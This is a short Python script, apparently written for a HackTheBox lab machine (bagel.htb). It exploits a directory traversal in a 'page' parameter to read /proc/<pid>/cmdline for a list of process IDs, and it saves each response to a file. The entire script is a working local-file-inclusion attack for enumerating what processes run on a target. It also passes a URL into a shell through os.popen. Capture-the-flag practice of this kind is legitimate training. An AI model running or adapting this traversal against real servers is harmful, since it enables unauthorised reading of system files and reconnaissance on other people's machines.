import os

# Define the path to the file containing the process numbers
process_file = "process.txt"

# Define the base URL to send the curl requests to
base_url = "http://bagel.htb:8000/?page=../../../../../../proc/{}/cmdline"

# Open the output file
with open("output.txt", "w") as output_file:

    # Read the contents of the process file
    with open(process_file, "r") as f:
        process_numbers = f.read().splitlines()

    # Loop through each process number and send a curl request
    for number in process_numbers:
        # Build the URL for this process number
        url = base_url.format(number)
        # Send the curl request and write the output to the output file
        curl_output = os.popen(f"curl {url}").read()
        output_file.write(curl_output + number)
        output_file.write("\n")  # Add a blank line between requests
